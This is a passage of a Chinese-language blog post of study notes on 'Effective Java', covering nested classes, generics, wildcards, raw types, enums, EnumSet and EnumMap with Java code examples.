class="built_in">this</span>.radius = radius; &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123; <span class="keyword">return</span> Math.PI * (radius * radius); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> width;</span><br><span class="line"> </span><br><span class="line">    Rectangle(<span class="type">double</span> length, <span class="type">double</span> width) &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width  = width;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123; <span class="keyword">return</span> length * width; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">extends</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    Square(<span class="type">double</span> side) &#123;</span><br><span class="line">        <span class="built_in">super</span>(side, side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="24-优先考虑静态成员类-1"   >          <a href="#24-优先考虑静态成员类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#24-优先考虑静态成员类-1" class="headerlink" title="24.优先考虑静态成员类"></a>24.优先考虑静态成员类</h2>      <p>嵌套类</p><ul><li>静态成员类</li><li>非静态成员类</li><li>匿名类</li><li>局部类</li></ul><p>匿名类</p><ul><li>在使用的同时被声明和实例化</li><li>可以出现在任何允许出现表达式的地方</li><li>没有静态成员</li><li>无法实现多个接口，或者同时扩展类并实现接口</li><li>保持简短，否则影响可读性</li><li>创建函数对象</li></ul><p>局部类</p><ul><li><p>在可以声明局部变量的地方声明</p></li><li><p>有名字，可被重复使用</p></li><li><p>没有静态成员</p></li><li><p>保持简短，否则影响可读性</p></li></ul>        <h2 id="25-限制源文件为单个顶级类"   >          <a href="#25-限制源文件为单个顶级类" class="heading-link"><i class="fas fa-link"></i></a><a href="#25-限制源文件为单个顶级类" class="headerlink" title="25.限制源文件为单个顶级类"></a>25.限制源文件为单个顶级类</h2>              <h1 id="第五章-泛型"   >          <a href="#第五章-泛型" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五章-泛型" class="headerlink" title="第五章 泛型"></a>第五章 泛型</h1>      <p>为什么引入泛型</p><ul><li>与C++ template类似，但目的有区别</li><li>减少程序运行错误的发生</li><li>减少方法的重载</li></ul><p>命名规则</p><ul><li>E - Element (通常代表集合类中的元素)</li><li>K - Key</li><li>N - Number</li><li>V - Value</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Util</span> &#123;  </span><br><span class="line"><span class="comment">//该方法用于比较两个Pair对象是否相等。  </span></span><br><span class="line"><span class="comment">//泛型参数必须写在方法返回类型boolean之前  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;K, V&gt; <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(Pair&lt;K,V&gt; p1, Pair&lt;K, V&gt; p2)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> p1.getKey().equals(p2.getKey())&amp;&amp;  </span><br><span class="line">              p1.getValue().equals(p2.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">Pair&lt;Integer,String&gt; p1 = <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="number">1</span>, <span class="string">&quot;apple&quot;</span>);  </span><br><span class="line">Pair&lt;Integer,String&gt; p2 = <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="number">2</span>, <span class="string">&quot;pear&quot;</span>);  </span><br><span class="line"><span class="type">boolean</span> <span class="variable">same</span> <span class="operator">=</span> Util.&lt;Integer, String&gt;compare(p1, p2);  </span><br><span class="line"><span class="comment">//实际上，编译器可以通过Pair当中的类型来推断compare需要使用的类型，所以可以简写为：  </span></span><br><span class="line"><span class="type">boolean</span> same2= Util. compare(p1, p2);  </span><br></pre></td></tr></table></div></figure><p>限制类型参数在某个范围内</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;&#123;  <span class="comment">//类型参数限定为Number的子类         </span></span><br><span class="line">      <span class="keyword">private</span> T t;         </span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">Box</span><span class="params">(T t)</span>&#123;  </span><br><span class="line">             <span class="built_in">this</span>.t = t;  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;  </span><br><span class="line">             System.out.println(t.getClass().getName());  </span><br><span class="line">      &#125;         </span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">   </span><br><span class="line">             Box&lt;Integer&gt; box1 = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;Integer&gt;(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">2</span>));  </span><br><span class="line">             box1.print();  <span class="comment">//打印结果：java.lang.Integer  </span></span><br><span class="line">             Box&lt;Double&gt; box2 = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;Double&gt;(<span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">1.2</span>));  </span><br><span class="line">             box2.print();  <span class="comment">//打印结果：java.lang.Double  </span></span><br><span class="line">              </span><br><span class="line">             Box&lt;String&gt; box2 = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;String&gt;(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>)); <span class="comment">//报错，因为String类型不是Number的子类  </span></span><br><span class="line">             box2.print();  </span><br><span class="line">      </span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span> &amp; Cloneable &amp; Comparable &gt;&#123;   </span><br><span class="line"><span class="comment">//该类型必须为Number的子类并且实现了Cloneable接口和Comparable接口。  </span></span><br><span class="line">……  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></div></figure><p>泛型类的继承</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">someObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="type">Integer</span> <span class="variable">someInteger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line">someObject = someInteger; <span class="comment">// 因为Integer是Object的子类  </span></span><br><span class="line">Box &lt; Number &gt; box = <span class="keyword">new</span> <span class="title class_">Box</span> &lt; Number &gt; ();</span><br><span class="line">box.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>)); <span class="comment">// Integer是Number的子类  </span></span><br><span class="line">box.add(<span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">10.1</span>)); <span class="comment">// Double同样是Number的子类  </span></span><br><span class="line"><span class="comment">//该方法接受的参数类型为Box&lt;Number&gt;  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">boxTest</span><span class="params">(Box &lt; Number &gt; n)</span> &#123;</span><br><span class="line">    ……&#125;</span><br><span class="line"><span class="comment">//下面两种调用都会报错  </span></span><br><span class="line">boxTest(Box &lt; Integer &gt; );</span><br><span class="line">boxTest(Box &lt; Double &gt; );</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>通配符</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该方法接受的参数类型为Box&lt;Number&gt;  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">boxTest</span><span class="params">(Box &lt; Number &gt; n)</span> &#123;</span><br><span class="line">    ……&#125;</span><br><span class="line"><span class="comment">//下面两种调用都会报错  </span></span><br><span class="line">boxTest(Box &lt; Integer &gt; );</span><br><span class="line">boxTest(Box &lt; Double &gt; );</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">boxTest</span><span class="params">(Box &lt; ? extends Number &gt; n)</span> &#123;</span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="26-不要使用原生态类型"   >          <a href="#26-不要使用原生态类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#26-不要使用原生态类型" class="headerlink" title="26.不要使用原生态类型"></a>26.不要使用原生态类型</h2>      <p>原生态类型（raw type）</p><ul><li>不带任何实际类型参数的泛型名称</li><li>每个泛型都定一个原生态类型</li><li>List&lt;E&gt;的原生态类型是List</li></ul>        <h2 id="27-消除非受检警告"   >          <a href="#27-消除非受检警告" class="heading-link"><i class="fas fa-link"></i></a><a href="#27-消除非受检警告" class="headerlink" title="27.消除非受检警告"></a>27.消除非受检警告</h2>      <ul><li>改写代码</li><li>@SuppressWarnings(“unchecked”)<ul><li>无法通过修改代码消除警告</li><li>证明代码是安全的</li><li>在尽可能小得范围内使用</li><li>添加对应注释</li></ul></li></ul>        <h2 id="28-列表优先数组"   >          <a href="#28-列表优先数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#28-列表优先数组" class="headerlink" title="28.列表优先数组"></a>28.列表优先数组</h2>      <ul><li>数组与泛型的不同<ul><li>数组是协变的，泛型是不可变的</li><li>数组是具体化的（reified），泛型是通过擦除（erasure）来实现的<ul><li>数组和泛型不能很好的混合使用</li><li>无法创建泛型（List&lt;E&gt;[]）、参数化类型（List&lt;String&gt;[]）或类型参数（E[]）的数组</li><li>优先利用集合类型list&lt;E&gt;，而不是数组类型E[]</li></ul></li></ul></li></ul>        <h2 id="29-优先考虑泛型"   >          <a href="#29-优先考虑泛型" class="heading-link"><i class="fas fa-link"></i></a><a href="#29-优先考虑泛型" class="headerlink" title="29.优先考虑泛型"></a>29.优先考虑泛型</h2>      <p>不能创建不可具体化类型的数组</p><ul><li>方法1：创建Object数组，转换为泛型数组类型</li><li>方法2：将elements域的类型从E[]改为Object[]。获取元素时进行类型转换</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generic stack using Object[] </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stack</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> Object[] elements;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_INITIAL_CAPACITY</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stack</span><span class="params">()</span> &#123;</span><br><span class="line">        elements = <span class="keyword">new</span> <span class="title class_">Object</span>[DEFAULT_INITIAL_CAPACITY];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        ensureCapacity();</span><br><span class="line">        elements[size++] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Appropriate suppression of unchecked warning</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EmptyStackException</span>();</span><br><span class="line">       <span class="comment">// push requires elements to be of type E, so cast is correct</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span></span><br><span class="line">                (E) elements[--size];</span><br><span class="line">        elements[size] = <span class="literal">null</span>; <span class="comment">// Eliminate obsolete reference</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="30-优先考虑泛型方法"   >          <a href="#30-优先考虑泛型方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#30-优先考虑泛型方法" class="headerlink" title="30.优先考虑泛型方法"></a>30.优先考虑泛型方法</h2>      <p>编写泛型方法与编写泛型类型类似</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generic method</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt; E &gt; Set &lt; E &gt; union(Set &lt; E &gt; s1, Set &lt; E &gt; s2) &#123;</span><br><span class="line">    Set &lt; E &gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span> &lt; &gt; (s1);</span><br><span class="line">    result.addAll(s2);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Simple program to exercise generic method</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Set &lt; String &gt; guys = Set.of(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;Dick&quot;</span>, <span class="string">&quot;Harry&quot;</span>);</span><br><span class="line">    Set &lt; String &gt; stooges = Set.of(<span class="string">&quot;Larry&quot;</span>, <span class="string">&quot;Moe&quot;</span>, <span class="string">&quot;Curly&quot;</span>);</span><br><span class="line">    Set &lt; String &gt; aflCio = union(guys, stooges);</span><br><span class="line">    System.out.println(aflCio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>泛型单例工厂</p><p>递归类型限制</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RecursiveTypeBound</span> &#123;</span><br><span class="line">    <span class="comment">// Returns max value in a collection - uses recursive type bound</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;E&gt;&gt; E <span class="title function_">max</span><span class="params">(Collection&lt;E&gt; c)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (c.isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Empty collection&quot;</span>);</span><br><span class="line">         <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (E e : c)</span><br><span class="line">            <span class="keyword">if</span> (result == <span class="literal">null</span> || e.compareTo(result) &gt; <span class="number">0</span>)</span><br><span class="line">                result = Objects.requireNonNull(e);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; argList = Arrays.asList(args);</span><br><span class="line">        System.out.println(max(argList));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="31-利用有限制的通配符来提升API的灵活性"   >          <a href="#31-利用有限制的通配符来提升API的灵活性" class="heading-link"><i class="fas fa-link"></i></a><a href="#31-利用有限制的通配符来提升API的灵活性" class="headerlink" title="31.利用有限制的通配符来提升API的灵活性"></a>31.利用有限制的通配符来提升API的灵活性</h2>              <h2 id="33-优先考虑类型安全的异构容器"   >          <a href="#33-优先考虑类型安全的异构容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#33-优先考虑类型安全的异构容器" class="headerlink" title="33.优先考虑类型安全的异构容器"></a>33.优先考虑类型安全的异构容器</h2>      <p>容器需要更多的灵活性</p><ul><li>将键（key）参数化，而不是将容器（container）参数化</li></ul>        <h1 id="第六章-枚举和注解"   >          <a href="#第六章-枚举和注解" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六章-枚举和注解" class="headerlink" title="第六章 枚举和注解"></a>第六章 枚举和注解</h1>              <h2 id="34-用enum代替int常量"   >          <a href="#34-用enum代替int常量" class="heading-link"><i class="fas fa-link"></i></a><a href="#34-用enum代替int常量" class="headerlink" title="34.用enum代替int常量"></a>34.用enum代替int常量</h2>      <p>枚举类型</p><ul><li>提供编译时的类型安全</li><li>有命名空间，可以有同名常量</li><li>可以添加任意的方法和域</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Operation</span> &#123;</span><br><span class="line">    PLUS(<span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    MINUS(<span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x - y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    TIMES(<span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x * y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    DIVIDE(<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x / y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String symbol;</span><br><span class="line"></span><br><span class="line">    Operation(String symbol) &#123;</span><br><span class="line">        <span class="built_in">this</span>.symbol = symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">apply</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Welcome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Operation.PLUS.apply(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="35-用实例域代替序数"   >          <a href="#35-用实例域代替序数" class="heading-link"><i class="fas fa-link"></i></a><a href="#35-用实例域代替序数" class="headerlink" title="35.用实例域代替序数"></a>35.用实例域代替序数</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Ensemble</span> &#123;</span><br><span class="line">    SOLO(<span class="number">1</span>), DUET(<span class="number">2</span>), TRIO(<span class="number">3</span>), QUARTET(<span class="number">4</span>), QUINTET(<span class="number">5</span>),</span><br><span class="line">    SEXTET(<span class="number">6</span>), SEPTET(<span class="number">7</span>), OCTET(<span class="number">8</span>), DOUBLE_QUARTET(<span class="number">8</span>),</span><br><span class="line">    NONET(<span class="number">9</span>), DECTET(<span class="number">10</span>), TRIPLE_QUARTET(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> numberOfMusicians;</span><br><span class="line">    Ensemble(<span class="type">int</span> size) &#123;</span><br><span class="line">        <span class="built_in">this</span>.numberOfMusicians = size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfMusicians</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> numberOfMusicians;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="36-用EnumSet代替位域"   >          <a href="#36-用EnumSet代替位域" class="heading-link"><i class="fas fa-link"></i></a><a href="#36-用EnumSet代替位域" class="headerlink" title="36.用EnumSet代替位域"></a>36.用EnumSet代替位域</h2>      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Style</span> &#123; BOLD, ITALIC, UNDERLINE, STRIKETHROUGH &#125;</span><br><span class="line">    <span class="comment">// Any Set could be passed in, but EnumSet is clearly best</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">applyStyles</span><span class="params">(Set &lt; Style &gt; styles)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text.applyStyles(EnumSet.of(Style.BOLD, Style.ITALIC));</span><br></pre></td></tr></table></div></figure>        <h2 id="37-用EnumMap代替序数索引"   >          <a href="#37-用EnumMap代替序数索引" class="heading-link"><i class="fas fa-link"></i></a><a href="#37-用EnumMap代替序数索引" class="headerlink" title="37.用EnumMap代替序数索引"></a>37.用EnumMap代替序数索引</h2>      <p>枚举类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MixColor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">        Red(<span class="string">&quot;Red&quot;</span>), Blue(<span class="string">&quot;Blue&quot;</span>), Green(<span class="string">&quot;Green&quot;</span>),</span><br><span class="line">        Cyan(<span class="string">&quot;Cyan&quot;</span>), Purple(<span class="string">&quot;Purple&quot;</span>), White(<span class="string">&quot;White&quot;</span>),</span><br><span class="line">        Yellow(<span class="string">&quot;Yellow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String symbol;</span><br><span class="line">        Color(String symbol) &#123;</span><br><span class="line">            <span class="built_in">this</span>.symbol = symbol;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> symbol;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;EnumSet&lt;Color&gt;, Color&gt; m = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">applyStyles</span><span class="params">()</span> &#123;</span><br><span class="line">        m.put(EnumSet.of(Color.Red), Color.Red);</span><br><span class="line">        m.put(EnumSet.of(Color.Blue), Color.Blue);</span><br><span class="line">        m.put(EnumSet.of(Color.Green), Color.Green);</span><br><span class="line">        m.put(EnumSet.of(Color.Red, Color.Green), Color.Yellow);</span><br><span class="line">        m.put(EnumSet.of(Color.Green, Color.Blue), Color.Cyan);</span><br><span class="line">        m.put(EnumSet.of(Color.Red, Color.Blue), Color.Purple);</span><br><span class="line">        m.put(EnumSet.of(Color.Red, Color.Blue, Color.Green), Color.White);</span><br><span class="line">    